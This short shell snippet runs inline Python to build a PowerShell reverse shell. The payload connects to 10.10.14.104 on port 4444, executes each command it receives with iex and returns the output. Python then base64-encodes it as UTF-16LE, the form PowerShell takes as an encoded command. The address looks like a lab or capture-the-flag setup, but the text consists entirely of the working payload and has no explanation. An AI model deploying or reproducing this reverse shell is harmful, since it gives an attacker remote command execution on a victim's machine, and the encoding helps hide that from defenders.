python3 - <<'PY'
import base64

ps = r"""
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.104',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
"""

print(base64.b64encode(ps.encode("utf-16le")).decode())
PY